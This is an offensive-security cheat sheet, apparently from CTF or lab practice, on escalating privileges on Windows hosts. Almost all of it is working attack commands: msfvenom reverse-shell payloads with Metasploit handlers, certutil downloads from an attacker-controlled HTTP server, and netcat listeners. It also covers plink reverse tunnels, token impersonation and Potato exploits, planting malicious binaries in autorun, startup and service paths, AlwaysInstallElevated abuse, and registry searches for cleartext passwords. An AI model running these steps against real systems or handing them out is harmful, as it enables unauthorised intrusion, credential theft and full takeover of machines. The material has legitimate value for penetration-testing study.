# Escalation Paths

1. [Kernel Exploits](#kernel-exploits)
2. [Passwords and Port Forwarding](#passwords-and-port-forwarding)
3. [Windows Subsystem for Linux](#windows-subsystem-for-linux)
4. [Impersonation and Potato Attacks](#impersonation-and-potato-attacks)
5. [getsystem](#getsystem)
6. [runas](#runas)
7. [Registry](#registry)
8. [Executable Files](#executable-files)
9. [Startup Applications](#startup-applications)
10. [Service Permissions](#service-permissions)

## Kernel Exploits

* [Reference for Windows Kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)

```shell
#metasploit kernel exploitation
#exploit suggested by exploit suggester
use exploit/windows/local/ms10_015_kitrap0d

options

set SESSION 9

set LHOST tun0

set LPORT 5555
#gives meterpreter shell
getuid
```

```shell
#manual kernel exploitation
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx > manual.aspx
#create aspx shell

ftp 10.10.10.5
#anonymous login

put manual.aspx

exit

nc -lvnp 4444
#setup listener
#check uploaded aspx shell on web
#we get a reverse shell

whoami
#iis apppool\web

#in attacker machine
#check for vulnerable kernel exploits using windows exploit suggester
#and download exploit files for MS10-059
python3 -m http.server

#in victim shell
cd C:\Windows\Temp

certutil -urlcache -f http://10.10.14.5:8000/ms10-059.exe ms.exe

#setup listener on attacker machine
nc -nvlp 5555

#in victim shell
ms.exe 10.10.14.5 5555

#we get reverse shell on port 5555 listener
whoami
#system
```

## Passwords and Port Forwarding

```shell
systeminfo

whoami

net users

net user alfred
#check groups

ipconfig

netstat -ano
#check open ports

arp -a

#hunting for cleartext passwords
findstr /si password *.txt

#search in registry
reg query HKLM /f password /t REG_SZ /s
#preferred method

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

#attempt in case of password reuse
#we can use port forwarding method using plink.exe

#in attacker machine
python3 -m http.server

#in victim machine
cd C:\Users\alfred

certutil -urlcache -f http://10.10.14.2:8000/plink.exe plink.exe

#in attacker machine
#for plink config
sudo apt install ssh

sudo gedit /etc/ssh.sshd_config
#edit to enable permitrootlogin

sudo service ssh restart
sudo service ssh start

#in victim machine
plink.exe -l root -pw passwordHere -R 445:127.0.0.1:445 10.10.14.2
#access port 445 of victim machine from port 445 of attacker machine

#we get attacker shell in victim session
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
#winexe to run Windows commands on Linux
#127.0.0.1 as we are using port forwarding
#password reuse

whoami
#Administrator
```

## Windows Subsystem for Linux

```shell
#on windows shell
where -R C:\Windows bash.exe

where -R C:\Windows wsl.exe
#to find bash.exe or wsl.exe
#for getting into wsl

C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\bash.exe
#we get linux shell now

whoami
#root

#we cannot access the Windows files yet

python -c "import pty;pty.spawn('/bin/bash')"

#using linux privesc

ls -la
#check files

history
#check history
#this contains creds for Administrator

#on attacker machine
smbexec.py Administrator:'passwordfound'@10.10.10.97
#gives us a semi-shell as System
```

## Impersonation and Potato Attacks

* Tokens - temporary keys that allow access to system/network without using creds.

* Types of tokens:

  * Delegate - logging into machine, using RDP

  * Impersonate - 'non-interactive', like attaching network drive or domain logon script

* Token impersonation - impersonate another user logged onto system.

* Certain enabled privileges, which can be found out by ```whoami /priv```, can be [impersonation privileges](https://github.com/gtworek/Priv2Admin).

* An example of a Potato attack would be [Juicy Potato](https://github.com/ohpe/juicy-potato), which exploits the enabled ```SeImpersonate``` or ```SeAssignPrimaryToken``` privileges:

```shell
whoami /priv
#SeImpersonatePrivilege enabled

#in attacker machine
msfconsole -q

use exploit/multi/script/web_delivery

options

show targets

set target 2
#powershell

set payload windows/meterpreter/reverse_tcp
#x64 does not work

set LHOST 10.10.14.3

set srvhost 10.10.14.3

run
#this gives us a powershell command to run
#run the command in victim shell
#we get a meterpreter shell

sessions 1

getuid
#kohsuke
#now we can try potato exploit

background

use exploit/windows/local/ms16_075_reflection

options

set LHOST 10.10.14.3

set LPORT 5555

set payload windows/x64/meterpreter/reverse_tcp

load incognito

list_tokens -u
#we have impersonate token

impersonate_token "NT AUTHORITY\SYSTEM"

shell
#we get shell as System
```

## getsystem

```shell
#in meterpreter shell
getsystem
#uses multiple techniques for privesc
#can be detected by antivirus

getsystem -h
```

## runas

```shell
cmdkey /list
#there are stored creds for Administrator

#we can use runas to get root flag
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"
```

## Registry

```shell
#check autoruns in victim machine
#in cmd prompt
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

#for 'My Program' entry in Autoruns
#check access using accesschk tool
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
#'Everyone' user group has all access permission on 'program.exe'

#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.14.31.212 -f exe -o program.exe

msfconsole -q

use multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 10.14.31.212

run
#starts listener

#in another tab
python3 -m http.server

#in attacker machine
certutil.exe -urlcache -f http://10.14.31.212:8000/program.exe program.exe

copy program.exe "C:\Program Files\Autorun Program"
#overwrites autorun program.exe with malicious program

#now we can logout and login back as administrator user
#this gives us a meterpreter shell at our msfconsole listener
```

```shell
#AlwaysInstallElevated
#in victim cmd prompt
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

reg query HKCU\Software\Policies\Microsoft\Windows\Installer
#for both queries, AlwaysInstallElevated is 1

#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.14.31.212 -f msi -o setup.msi

msfconsole -q

set payload windows/meterpreter/reverse_tcp

set LHOST 10.14.31.212

run

#in victim machine
cd C:\Temp

certutil.exe -urlcache -f http://10.14.31.212:8000/setup.msi setup.msi

msiexec /quiet /qn /i C:\Temp\setup.msi

net local administrators
#our user is added to Administrators group
```

```shell
#regsvc
#in victim powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
#output shows that user belongs to 'Interactive' and has 'full control' over registry key

#copy the required source file, windows_service.c to attacker machine

#in attacker machine
vim windows_service.c
#replace system() function code to include -
#cmd.exe /k net localgroup administrators user /add

#compile the C code
x86_64-w64-mingw32-gcc windows_service.c -o x.exe

#copy x.exe to victim machine in C:\Temp
#in victim command prompt
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\x.exe /f
#add registry entry with image path value as x.exe

sc start regsvc
#start modified service

net localgroup administrators
#our user is added to administrators group
```

## Executable Files

```shell
#in victim cmd prompt
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
#'everyone' user group has all access permission on filepermservice.exe

#similar to regsvc
#create and upload malicious exe to C:\Temp
copy /y C:\Temp\x.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc

net localgroup administrators
#our user is added to admin group
```

## Startup Applications

```shell
#in windows cmd prompt
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
#BUILTIN\Users group has full access (F) to directory

#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.31.212 -f exe -o x.exe

msfconsole -q

use multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 10.14.31.212

run

#now copy x.exe to windows machine
move x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

#logout and then login as administrator
#we get a meterpreter shell now
```

## Service Permissions

```shell
#binary paths
#in windows cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
#user has SERVICE_CHANGE_CONFIG permission

sc qc daclsvc

sc config daclsvc binpath= "net localgroup administrators user /add"

sc start daclsvc

net localgroup administrators
#it works and user has been added to the group

#we can also exploit unquoted service paths, if any exist
```
